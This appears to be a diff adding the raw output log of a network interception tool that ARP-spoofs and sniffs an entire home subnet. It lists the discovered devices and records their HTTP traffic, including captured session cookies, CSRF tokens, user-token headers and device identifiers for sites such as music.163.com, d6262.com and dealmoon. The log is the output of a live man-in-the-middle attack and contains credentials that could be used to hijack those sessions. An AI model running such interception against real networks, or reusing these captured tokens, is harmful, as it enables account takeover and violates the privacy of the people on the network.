+[DESKTOP-2LU0P34/192.168.2.5 > 216.58.218.133:https] [HTTPS] https://dfw25s08-in-f133.1e100.net./
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[DESKTOP-2LU0P34/192.168.2.5 > 40.78.98.202:https] [HTTPS] https://40.78.98.202/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[DESKTOP-2LU0P34/192.168.2.5 > 40.78.98.202:https] [HTTPS] https://40.78.98.202/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[DESKTOP-2LU0P34/192.168.2.5 > 40.78.98.202:https] [HTTPS] https://40.78.98.202/
+[DESKTOP-2LU0P34/192.168.2.5 > 40.78.98.202:https] [HTTPS] https://40.78.98.202/
+[192.168.2.3 > 114.134.80.163:http] [GET] http://api.weibo.cn/2/remind/unread_count?remind_version=282&networktype=wifi&with_comment_attitude=1&ext_all=0&moduleID=700&c=android&i=0202e51&s=551d1817&ua=motorola-Nexus%206__weibo__6.5.1__android__android6.0.1&wm=4260_0001&aid=01An-CFqcBfZHa0NRyo5NHaxXsgcJ9AKoGdAplc0Psp1Z9WYY.&idc=&v_f=2&from=1065195010&gsid=_2A256UMNeDeTxGedG71MV9i7FwzuIHXVXRFGWrDV6PUJbrdANLXH9kWpzHqcPjzjj4TzMZwA4258A1YaqCA..&lang=en_US&skin=default&oldwm=4260_0001&sflag=1&with_settings=1&unread_message=1&with_page_group=1
+[192.168.2.3 > 114.134.80.163:http] [GET] http://api.weibo.cn/2/remind/unread_count?remind_version=282&networktype=wifi&with_comment_attitude=1&ext_all=0&moduleID=700&c=android&i=0202e51&s=551d1817&ua=motorola-Nexus%206__weibo__6.5.1__android__android6.0.1&wm=4260_0001&aid=01An-CFqcBfZHa0NRyo5NHaxXsgcJ9AKoGdAplc0Psp1Z9WYY.&idc=&v_f=2&from=1065195010&gsid=_2A256UMNeDeTxGedG71MV9i7FwzuIHXVXRFGWrDV6PUJbrdANLXH9kWpzHqcPjzjj4TzMZwA4258A1YaqCA..&lang=en_US&skin=default&oldwm=4260_0001&sflag=1&with_settings=1&unread_message=1&with_page_group=1
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[DESKTOP-2LU0P34/192.168.2.5 > 40.78.98.202:https] [HTTPS] https://40.78.98.202/
+[192.168.2.3 > 216.58.194.46:https] [HTTPS] https://dfw25s12-in-f14.1e100.net./
+[192.168.2.3 > 203.205.167.183:https] [HTTPS] https://203.205.167.183/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 216.58.194.46:https] [HTTPS] https://dfw25s12-in-f14.1e100.net./
+[192.168.2.3 > 216.58.194.46:https] [HTTPS] https://dfw25s12-in-f14.1e100.net./
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 216.58.194.46:https] [HTTPS] https://dfw25s12-in-f14.1e100.net./
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 216.58.194.46:https] [HTTPS] https://dfw25s12-in-f14.1e100.net./
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 223.252.199.7:https] [HTTPS] https://223.252.199.7/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 216.58.194.46:https] [HTTPS] https://dfw25s12-in-f14.1e100.net./
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 216.58.194.46:https] [HTTPS] https://dfw25s12-in-f14.1e100.net./
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 216.58.194.46:https] [HTTPS] https://dfw25s12-in-f14.1e100.net./
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 216.58.194.46:https] [HTTPS] https://dfw25s12-in-f14.1e100.net./
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.3 > 216.58.194.46:https] [HTTPS] https://dfw25s12-in-f14.1e100.net./
+[192.168.2.3 > 216.58.218.138:https] [HTTPS] https://dfw25s08-in-f10.1e100.net./
+[192.168.2.3 > 216.58.218.138:https] [HTTPS] https://dfw25s08-in-f138.1e100.net./
+[192.168.2.6 > 172.217.2.168:https] [HTTPS] https://dfw06s40-in-f8.1e100.net./
+[192.168.2.3 > 198.105.244.117:https] [HTTPS] https://198.105.244.117/
+[192.168.2.6 > 172.217.2.168:https] [HTTPS] https://dfw06s40-in-f8.1e100.net./
+[192.168.2.3 > 216.58.218.138:https] [HTTPS] https://dfw25s08-in-f10.1e100.net./
+[I] Lost 1 target :
+
+  [LOST] 192.168.2.5 : 18:5E:0F:A6:1E:FE / DESKTOP-2LU0P34 ( Intel Corporate )
+
+
+[192.168.2.3 > 174.35.21.94:http] [GET] http://c.m.163.com/nc/topicset/android/subscribe/manage/listspecial.html
+[192.168.2.3 > 174.35.21.94:http] [GET] http://c.m.163.com/nc/article/headline/T1348647909107/0-20.html?from=toutiao&size=20&passport=YGzWjPUOm5FR9GmeMh%2F0%2BOxu5Qgz9IwfxBMkTUgNz7o%3D&devId=XxJHWjDB8Z3OMY7BmLCymWiX%2FJMo9Daf3vF4bTE6tPQtjIbe84vBweLdeJqr%2BHuO&lat=&lon=&version=8.0&net=wifi&ts=1465175715&sign=FmpCrTy0znAyJDcqUWsquzCRLHdC821TnqvIww%2FS3tR48ErR02zJ6%2FKXOnxX046I&encryption=1&canal=netease&mac=racUMC0A9havm%2BHe6jH3YAvVdjgSXYDtwEDZ03eH1l8%3D
+[192.168.2.3 > 174.35.21.94:http] [GET] http://c.m.163.com/nc/topicset/android/subscribe/manage/listspecial.html
+[192.168.2.3 > 174.35.21.94:http] [GET] http://c.m.163.com/nc/article/headline/T1348647909107/0-20.html?from=toutiao&size=20&passport=YGzWjPUOm5FR9GmeMh%2F0%2BOxu5Qgz9IwfxBMkTUgNz7o%3D&devId=XxJHWjDB8Z3OMY7BmLCymWiX%2FJMo9Daf3vF4bTE6tPQtjIbe84vBweLdeJqr%2BHuO&lat=&lon=&version=8.0&net=wifi&ts=1465175715&sign=FmpCrTy0znAyJDcqUWsquzCRLHdC821TnqvIww%2FS3tR48ErR02zJ6%2FKXOnxX046I&encryption=1&canal=netease&mac=racUMC0A9havm%2BHe6jH3YAvVdjgSXYDtwEDZ03eH1l8%3D
+[192.168.2.3 > 216.58.218.138:https] [HTTPS] https://dfw25s08-in-f138.1e100.net./
+[192.168.2.3 > 216.58.218.138:https] [HTTPS] https://dfw25s08-in-f10.1e100.net./
+[192.168.2.3 > 216.58.218.138:https] [HTTPS] https://dfw25s08-in-f10.1e100.net./
+[192.168.2.3 > 216.58.218.138:https] [HTTPS] https://dfw25s08-in-f138.1e100.net./
+[192.168.2.3 > 216.58.218.138:https] [HTTPS] https://dfw25s08-in-f10.1e100.net./
+[192.168.2.3 > 114.112.103.3:http] [POST] http://www.qchannel01.cn/center/adj
+
+[HEADERS]
+
+  Content-Type : application/x-www-form-urlencoded
+  Content-Length : 507
+  User-Agent : Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus 6 Build/MMB30G)
+  Host : www.qchannel01.cn
+  Connection : close
+  Accept-Encoding : identity
+
+[BODY]
+
+  dur : ynzVqQe4ilk=
+  pv : AjjfAxgtbz4=
+  dtype : yF2GA5tm3o/bcSkTZwFsXA==
+  ts : xq3ENaxsYDmYUeq9NDlpxA==
+  appkey : IqAe1KJ99DcY5iq1a9I4+W8iAR/JYWJqwL/4tpuHBb8ZWE3SDW8W/g==
+  channel : 1XsDVLuFtUk=
+  uuid : opgTTvdLej+hAVnqJnqKP9PGpWSo4nv0nk/A27N6aGBA5iREmnBFJg==
+  nt : SGc10xnKa6TC9SAvm42qoQ==
+  nuid : lUPxCIj+ejWVJGsr0mDlmBi+SfPhOwScVJv281S5RGmrp2G6g9a3xA==
+  adr : fnPECArPimLl0Jd5r58ZwUfs98f+qIlfKt6EUGhq/pzMi+m7l6/qKUBwBSrQ+FZ3msD2entU9WEk=
+  did : 3bAKTDNW/6If25dpBhVNpQ==
+  e : 1
+
+
+[192.168.2.3 > 114.112.103.3:http] [POST] http://www.qchannel01.cn/center/adj
+
+[HEADERS]
+
+  Content-Type : application/x-www-form-urlencoded
+  Content-Length : 507
+  User-Agent : Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus 6 Build/MMB30G)
+  Host : www.qchannel01.cn
+  Connection : close
+  Accept-Encoding : identity
+
+[BODY]
+
+  dur : ynzVqQe4ilk=
+  pv : AjjfAxgtbz4=
+  dtype : yF2GA5tm3o/bcSkTZwFsXA==
+  ts : xq3ENaxsYDmYUeq9NDlpxA==
+  appkey : IqAe1KJ99DcY5iq1a9I4+W8iAR/JYWJqwL/4tpuHBb8ZWE3SDW8W/g==
+  channel : 1XsDVLuFtUk=
+  uuid : opgTTvdLej+hAVnqJnqKP9PGpWSo4nv0nk/A27N6aGBA5iREmnBFJg==
+  nt : SGc10xnKa6TC9SAvm42qoQ==
+  nuid : lUPxCIj+ejWVJGsr0mDlmBi+SfPhOwScVJv281S5RGmrp2G6g9a3xA==
+  adr : fnPECArPimLl0Jd5r58ZwUfs98f+qIlfKt6EUGhq/pzMi+m7l6/qKUBwBSrQ+FZ3msD2entU9WEk=
+  did : 3bAKTDNW/6If25dpBhVNpQ==
+  e : 1
+
+
+[192.168.2.3 > 223.252.199.10:http] [GET] http://p.3g.163.com/nc/push/register/?type=android&deviceid=CQk4YmQ0OTQwNTFlMjAzMjZlCVpYMUcyMjNWVko%253D&ifpush=1&v=8.0&replythread=1&os=6.0.1&model=Nexus+6&brand=google&pushSdk=netease&pushId=ZX1G223VVJ8bd494051e20326e_G4
+[192.168.2.3 > 223.252.199.10:http] [GET] http://p.3g.163.com/nc/push/register/?type=android&deviceid=CQk4YmQ0OTQwNTFlMjAzMjZlCVpYMUcyMjNWVko%253D&ifpush=1&v=8.0&replythread=1&os=6.0.1&model=Nexus+6&brand=google&pushSdk=netease&pushId=ZX1G223VVJ8bd494051e20326e_G4
+[192.168.2.3 > 216.58.218.138:https] [HTTPS] https://dfw25s08-in-f138.1e100.net./
+[192.168.2.3 > 216.58.218.138:https] [HTTPS] https://dfw25s08-in-f138.1e100.net./
+[192.168.2.3 > 216.58.218.138:https] [HTTPS] https://dfw25s08-in-f138.1e100.net./
+[192.168.2.6 > 216.58.194.106:https] [HTTPS] https://dfw06s48-in-f10.1e100.net./
+[192.168.2.6 > 216.58.194.106:https] [HTTPS] https://dfw06s48-in-f10.1e100.net./
+[192.168.2.6 > 216.58.194.106:https] [HTTPS] https://dfw06s48-in-f10.1e100.net./
+[192.168.2.5 > 162.125.32.129:https] [HTTPS] https://162.125.32.129/
+[192.168.2.6 > 216.58.194.106:https] [HTTPS] https://dfw06s48-in-f10.1e100.net./
+[192.168.2.3 > 216.58.218.138:https] [HTTPS] https://dfw25s08-in-f138.1e100.net./
+[192.168.2.6 > 216.58.194.106:https] [HTTPS] https://dfw06s48-in-f10.1e100.net./
+[192.168.2.3 > 216.58.218.138:https] [HTTPS] https://dfw25s08-in-f138.1e100.net./
+[192.168.2.6 > 216.58.194.106:https] [HTTPS] https://dfw06s48-in-f10.1e100.net./
+[192.168.2.6 > 74.125.196.105:https] [HTTPS] https://yk-in-f105.1e100.net./
+[192.168.2.6 > 74.125.196.105:https] [HTTPS] https://yk-in-f105.1e100.net./
+[192.168.2.6 > 216.58.218.141:https] [HTTPS] https://dfw25s08-in-f13.1e100.net./
+[192.168.2.6 > 74.125.196.105:https] [HTTPS] https://yk-in-f105.1e100.net./
+[192.168.2.6 > 216.58.218.141:https] [HTTPS] https://dfw25s08-in-f13.1e100.net./
+[192.168.2.6 > 74.125.196.105:https] [HTTPS] https://yk-in-f105.1e100.net./
+[192.168.2.6 > 216.58.194.106:https] [HTTPS] https://dfw06s48-in-f10.1e100.net./
+[192.168.2.6 > 216.58.218.141:https] [HTTPS] https://dfw25s08-in-f13.1e100.net./
+[192.168.2.6 > 216.58.218.141:https] [HTTPS] https://dfw25s08-in-f141.1e100.net./
+[192.168.2.3 > 216.58.218.138:https] [HTTPS] https://dfw25s08-in-f138.1e100.net./
+[192.168.2.3 > 216.58.218.138:https] [HTTPS] https://dfw25s08-in-f138.1e100.net./
+[192.168.2.6 > 216.58.218.141:https] [HTTPS] https://dfw25s08-in-f141.1e100.net./
+[192.168.2.6 > 216.58.218.141:https] [HTTPS] https://dfw25s08-in-f13.1e100.net./
+[192.168.2.6 > 216.58.218.141:https] [HTTPS] https://dfw25s08-in-f13.1e100.net./
+[192.168.2.6 > 216.58.218.141:https] [HTTPS] https://dfw25s08-in-f141.1e100.net./
+[192.168.2.6 > 74.125.196.105:https] [HTTPS] https://yk-in-f105.1e100.net./
+[192.168.2.3 > 114.112.103.22:http] [POST] http://www.qchannel04.cn/n/uplog
+
+[HEADERS]
+
+  Content-Type : application/x-www-form-urlencoded
+  Content-Length : 235
+  User-Agent : Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus 6 Build/MMB30G)
+  Host : www.qchannel04.cn
+  Connection : close
+  Accept-Encoding : identity
+
+[BODY]
+
+  category : qt
+  uid : 2AA9643F9CFDD84CA37D2BBFA63C1F96
+  did : 355458060317816
+  from : com.netease.newsreader.activity-8.0
+  sdk : 160418
+  net : wifi
+  osver : 6.0.1
+  mode : Nexus+6
+  channel : netease
+  msg : recvfrom+failed:+ECONNRESET+(Connection+reset+by+peer)
+
+
+[192.168.2.3 > 114.112.103.22:http] [POST] http://www.qchannel04.cn/n/uplog
+
+[HEADERS]
+
+  Content-Type : application/x-www-form-urlencoded
+  Content-Length : 235
+  User-Agent : Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus 6 Build/MMB30G)
+  Host : www.qchannel04.cn
+  Connection : close
+  Accept-Encoding : identity
+
+[BODY]
+
+  category : qt
+  uid : 2AA9643F9CFDD84CA37D2BBFA63C1F96
+  did : 355458060317816
+  from : com.netease.newsreader.activity-8.0
+  sdk : 160418
+  net : wifi
+  osver : 6.0.1
+  mode : Nexus+6
+  channel : netease
+  msg : recvfrom+failed:+ECONNRESET+(Connection+reset+by+peer)
+
+
+[192.168.2.3 > 223.252.199.10:http] [POST] http://c.3g.163.com/uc/api/visitor/v2/profile
+
+[HEADERS]
+
+  User-tk : kLBYrg64btBdyNGPvdNZRRVKt5DHV2xgmBVQztKew0548ErR02zJ6/KXOnxX046I
+  User-id : 6AY/AV8Br57xLKIsVJ8Rq0K5oYSYuk9Esbd+BjvjZ8BXrAq5w1QfQq247XQQ8A4qvuvX56akGnDmEEjJ4MOST6QoCdC+jtcsKf6pk0YJBgK50z3l1fiUf90N34DtI5eeePBK0dNsyevylzp8V9OOiA==
+  User-U : YGzWjPUOm5FR9GmeMh/0+Oxu5Qgz9IwfxBMkTUgNz7o=
+  User-D : XxJHWjDB8Z3OMY7BmLCymWiX/JMo9Daf3vF4bTE6tPQtjIbe84vBweLdeJqr+HuO
+  User-N : gDT1hagCM0JleyP7VxG9bQ==
+  User-C : 5aS05p2h
+  Content-Length : 44
+  Content-Type : text/plain; charset=ISO-8859-1
+  Host : c.3g.163.com
+  Connection : close
+  User-Agent : NewsApp/8.0 Android/6.0.1 (Nexus 6)
+  Accept-Encoding : identity
+
+[BODY]
+
+YGzWjPUOm5FR9GmeMh/0+Oxu5Qgz9IwfxBMkTUgNz7o=
+
+
+[192.168.2.3 > 223.252.199.10:http] [GET] http://c.3g.163.com/nc/uc/fav/subs/MTg0MTQ2MDk4N0BzaW5hLjE2My5jb20=.html?1465175724247
+[192.168.2.3 > 223.252.199.10:http] [POST] http://c.3g.163.com/uc/api/visitor/v2/profile
+
+[HEADERS]
+
+  User-tk : kLBYrg64btBdyNGPvdNZRRVKt5DHV2xgmBVQztKew0548ErR02zJ6/KXOnxX046I
+  User-id : 6AY/AV8Br57xLKIsVJ8Rq0K5oYSYuk9Esbd+BjvjZ8BXrAq5w1QfQq247XQQ8A4qvuvX56akGnDmEEjJ4MOST6QoCdC+jtcsKf6pk0YJBgK50z3l1fiUf90N34DtI5eeePBK0dNsyevylzp8V9OOiA==
+  User-U : YGzWjPUOm5FR9GmeMh/0+Oxu5Qgz9IwfxBMkTUgNz7o=
+  User-D : XxJHWjDB8Z3OMY7BmLCymWiX/JMo9Daf3vF4bTE6tPQtjIbe84vBweLdeJqr+HuO
+  User-N : gDT1hagCM0JleyP7VxG9bQ==
+  User-C : 5aS05p2h
+  Content-Length : 44
+  Content-Type : text/plain; charset=ISO-8859-1
+  Host : c.3g.163.com
+  Connection : close
+  User-Agent : NewsApp/8.0 Android/6.0.1 (Nexus 6)
+  Accept-Encoding : identity
+
+[BODY]
+
+YGzWjPUOm5FR9GmeMh/0+Oxu5Qgz9IwfxBMkTUgNz7o=
+
+
+[192.168.2.3 > 223.252.199.10:http] [GET] http://c.3g.163.com/nc/uc/fav/subs/MTg0MTQ2MDk4N0BzaW5hLjE2My5jb20=.html?1465175724247
+[192.168.2.6 > 172.217.2.168:https] [HTTPS] https://dfw06s40-in-f8.1e100.net./
+[192.168.2.6 > 74.125.196.105:https] [HTTPS] https://yk-in-f105.1e100.net./
+[192.168.2.6 > 172.217.2.168:https] [HTTPS] https://dfw06s40-in-f8.1e100.net./
+[192.168.2.6 > 216.58.218.141:https] [HTTPS] https://dfw25s08-in-f13.1e100.net./
+[192.168.2.3 > 198.105.244.117:http] [GET] http://m.163.com/special/newsclient/mmaconfig.xml
+[192.168.2.3 > 198.105.244.117:http] [GET] http://m.163.com/special/newsclient/mmaconfig.xml
+[192.168.2.6 > 74.125.196.105:https] [HTTPS] https://yk-in-f105.1e100.net./
+[192.168.2.6 > 216.58.218.141:https] [HTTPS] https://dfw25s08-in-f141.1e100.net./
+[192.168.2.6 > 216.58.218.141:https] [HTTPS] https://dfw25s08-in-f13.1e100.net./
+[192.168.2.6 > 216.58.218.141:https] [HTTPS] https://dfw25s08-in-f141.1e100.net./
+[192.168.2.6 > 216.58.218.141:https] [HTTPS] https://dfw25s08-in-f13.1e100.net./
+[192.168.2.6 > 74.125.196.105:https] [HTTPS] https://yk-in-f105.1e100.net./
+[192.168.2.6 > 216.58.218.141:https] [HTTPS] https://dfw25s08-in-f13.1e100.net./
+[192.168.2.6 > 74.125.196.105:https] [HTTPS] https://yk-in-f105.1e100.net./
+[192.168.2.6 > 216.58.218.141:https] [HTTPS] https://dfw25s08-in-f141.1e100.net./
+[192.168.2.3 > 183.129.205.80:http] [POST] http://sdk.open.phone.igexin.com/api.php?format=json&t=1
+[I] Starting [ spoofing:✔ discovery:✔ sniffer:✔ tcp-proxy:✘ http-proxy:✘ https-proxy:✘ sslstrip:✘ http-server:✘ dns-server:✘ ] ...
+
+
+[I] [en0] 192.168.2.2 : AC:BC:32:9C:A9:01 / en0 ( Apple )
+[I] [GATEWAY] 192.168.2.1 : 08:86:3B:F0:F5:B2 ( Belkin International )
+[I] [DISCOVERY] Targeting the whole subnet 192.168.2.0..192.168.2.255 ...
+[I] Acquired 4 new targets :
+
+  [NEW] 192.168.2.3 : 9C:D9:17:38:ED:9B ( Motorola Mobility, a Lenovo Company )
+  [NEW] 192.168.2.5 : 18:5E:0F:A6:1E:FE ( Intel Corporate )
+  [NEW] 192.168.2.6 : 64:BC:0C:4D:B2:78 ( LG Electronics )
+  [NEW] 224.0.0.251 : 01:00:5E:00:00:FB ( ??? )
+
+
+[I] Found NetBIOS name 'DESKTOP-2LU0P34' for address 192.168.2.5
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [GET] http://www.d6262.com/wap/memberCenter/message?method=hotNew
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [GET] http://www.d6262.com/wap/memberCenter/message?method=hotNew
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [GET] http://www.d6262.com/wap/index?d=account
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [GET] http://www.d6262.com/wap/index?d=account
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.3 > 223.252.199.7:http] [COOKIE] [music.163.com] MUSIC_U=34e8a56d7d619f19c1118fdc1ca8a7231946e488031f3ef11771076738bf6689a905171286c3e47fb80be253053bcf8dcb19b68a33677785; __csrf=b6f307f53f46571caf39c1cbab864274; buildver=133604; deviceId=MzU1NDU4MDYwMzE3ODE2CTljOmQ5OjE3OjM4OmVkOjliCThiZDQ5NDA1MWUyMDMyNmUJWlgxRzIyM1ZWSg%3D%3D; appver=3.4.1; os=android; osver=6.0.1; mobilename=Nexus6; resolution=2392x1440; channel=netease
+[192.168.2.3 > 223.252.199.7:http] [COOKIE] [music.163.com] MUSIC_U=34e8a56d7d619f19c1118fdc1ca8a7231946e488031f3ef11771076738bf6689a905171286c3e47fb80be253053bcf8dcb19b68a33677785; __csrf=b6f307f53f46571caf39c1cbab864274; buildver=133604; deviceId=MzU1NDU4MDYwMzE3ODE2CTljOmQ5OjE3OjM4OmVkOjliCThiZDQ5NDA1MWUyMDMyNmUJWlgxRzIyM1ZWSg%3D%3D; appver=3.4.1; os=android; osver=6.0.1; mobilename=Nexus6; resolution=2392x1440; channel=netease
+[192.168.2.3 > 223.252.199.7:http] [COOKIE] [music.163.com] MUSIC_U=34e8a56d7d619f19c1118fdc1ca8a7231946e488031f3ef11771076738bf6689a905171286c3e47fb80be253053bcf8dcb19b68a33677785; __csrf=b6f307f53f46571caf39c1cbab864274; buildver=133604; deviceId=MzU1NDU4MDYwMzE3ODE2CTljOmQ5OjE3OjM4OmVkOjliCThiZDQ5NDA1MWUyMDMyNmUJWlgxRzIyM1ZWSg%3D%3D; appver=3.4.1; os=android; osver=6.0.1; mobilename=Nexus6; resolution=2392x1440; channel=netease
+[192.168.2.3 > 223.252.199.7:http] [COOKIE] [music.163.com] MUSIC_U=34e8a56d7d619f19c1118fdc1ca8a7231946e488031f3ef11771076738bf6689a905171286c3e47fb80be253053bcf8dcb19b68a33677785; __csrf=b6f307f53f46571caf39c1cbab864274; buildver=133604; deviceId=MzU1NDU4MDYwMzE3ODE2CTljOmQ5OjE3OjM4OmVkOjliCThiZDQ5NDA1MWUyMDMyNmUJWlgxRzIyM1ZWSg%3D%3D; appver=3.4.1; os=android; osver=6.0.1; mobilename=Nexus6; resolution=2392x1440; channel=netease
+[DESKTOP-2LU0P34/192.168.2.5 > 54.90.148.22:https] [HTTPS] https://ec2-54-90-148-22.compute-1.amazonaws.com./
+[DESKTOP-2LU0P34/192.168.2.5 > 54.90.148.22:https] [HTTPS] https://ec2-54-90-148-22.compute-1.amazonaws.com./
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[DESKTOP-2LU0P34/192.168.2.5 > 216.58.194.142:https] [HTTPS] https://dfw06s49-in-f14.1e100.net./
+[DESKTOP-2LU0P34/192.168.2.5 > 54.90.148.22:https] [HTTPS] https://ec2-54-90-148-22.compute-1.amazonaws.com./
+[DESKTOP-2LU0P34/192.168.2.5 > 54.90.148.22:https] [HTTPS] https://ec2-54-90-148-22.compute-1.amazonaws.com./
+[DESKTOP-2LU0P34/192.168.2.5 > 54.90.148.22:https] [HTTPS] https://ec2-54-90-148-22.compute-1.amazonaws.com./
+[192.168.2.6 > 173.192.168.164:http] [COOKIE] [www.edegmaya.com] cdb_sid=1EHeQE
+[192.168.2.6 > 173.192.168.164:http] [COOKIE] [www.edegmaya.com] cdb_sid=1EHeQE
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 173.192.168.164:http] [COOKIE] [www.edegmaya.com] cdb_sid=1EHeQE
+[192.168.2.6 > 173.192.168.164:http] [COOKIE] [www.edegmaya.com] cdb_sid=1EHeQE
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[192.168.2.6 > 60.250.141.167:http] [COOKIE] [www.d6262.com] JSESSIONID=B3925F3ACFD672BFC60EE88354245157; route=28079f1520f792cc27ddea900726a1d0
+[DESKTOP-2LU0P34/192.168.2.5 > 96.17.202.217:http] [COOKIE] [cn.dealmoon.com] __gads=ID; __qca=P0-140395561-1454351897424; l=c; cmtlang=cn; searchHistoryData=ie80%7C%7C%E6%8A%A4%E8%82%9D; a1763_times=33; PHPSESSID=8c3f1a9fe29ccdb1bf34cbf805253b56; Hm_lvt_aa1bd5db226a1bae87a0ffc02cee3d7b=1465056639,1465077991,1465141366,1465174387; Hm_lpvt_aa1bd5db226a1bae87a0ffc02cee3d7b=1465174387; rip=H; TopDealTimeCn=1465172026
+[DESKTOP-2LU0P34/192.168.2.5 > 96.17.202.217:http] [POST] http://cn.dealmoon.com/ws/?cmd=deal/NewDealNum
+
+[HEADERS]
+
+  Host : cn.dealmoon.com
+  Connection : close
